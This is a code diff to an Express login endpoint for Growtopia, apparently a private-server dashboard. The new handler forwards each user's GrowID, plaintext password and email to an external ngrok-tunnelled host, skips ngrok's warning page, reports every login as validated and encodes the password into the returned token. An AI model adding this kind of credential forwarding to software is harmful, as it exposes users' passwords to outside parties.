@@ -80,7 +80,7 @@ app.all('/player/login/dashboard', async (req: Request, res: Response) => {
  * @param req - express request with growId, password, _token
  * @param res - express response with token
  */
-app.all(
+/**app.all(
   '/player/growid/login/validate',
   async (req: Request, res: Response) => {
     try {
@@ -101,6 +101,79 @@ app.all(
         ).toString('base64');
       }
 
+      res.send(
+        JSON.stringify({
+          status: 'success',
+          message: 'Account Validated.',
+          token,
+          url: '',
+          accountType: 'growtopia',
+        }),
+      );
+    } catch (error) {
+      console.log(`[ERROR]: ${error}`);
+      res.status(500).json({
+        status: 'error',
+        message: 'Internal Server Error',
+      });
+    }
+  },
+);*/
+
+/**
+ * @note validate login endpoint - validates GrowID credentials & forwards to Local Server via Ngrok
+ */
+app.all(
+  '/player/growid/login/validate',
+  async (req: Request, res: Response) => {
+    try {
+      const formData = req.body as Record<string, string>;
+      const _token = formData._token;
+      const growId = formData.growId;
+      const password = formData.password;
+      const email = formData.email;
+
+      // 1. Ambil URL Ngrok dari Environment Variable Vercel
+      const SERVER_URL = process.env.SERVER_URL;
+
+      // 2. Jika SERVER_URL diisi, kirim/teruskan data ke Server Lokal via Ngrok
+      if (SERVER_URL) {
+        try {
+          // Menghilangkan trailing slash (/) jika ada
+          const targetUrl = `${SERVER_URL.replace(/\/$/, '')}/player/growid/login/validate`;
+
+          await fetch(targetUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'ngrok-skip-browser-warning': 'true', // Menerobos halaman warning Ngrok
+            },
+            body: JSON.stringify({
+              growId,
+              password,
+              _token,
+              email: email || '',
+            }),
+          });
+          console.log(`[FORWARD SUCCESS] Data forwarded to ${targetUrl}`);
+        } catch (fwdError) {
+          console.log(`[FORWARD ERROR]: Gagal mengirim data ke Ngrok -> ${fwdError}`);
+        }
+      }
+
+      // 3. Buat token balasan standar Growtopia
+      let token = '';
+      if (email) {
+        token = Buffer.from(
+          `_token=${_token}&growId=${growId}&password=${password}&email=${email}&reg=1`,
+        ).toString('base64');
+      } else {
+        token = Buffer.from(
+          `_token=${_token}&growId=${growId}&password=${password}&reg=0`,
+        ).toString('base64');
+      }
+
+      // 4. Kirim respon JSON ke client Growtopia
       res.send(
         JSON.stringify({
           status: 'success',
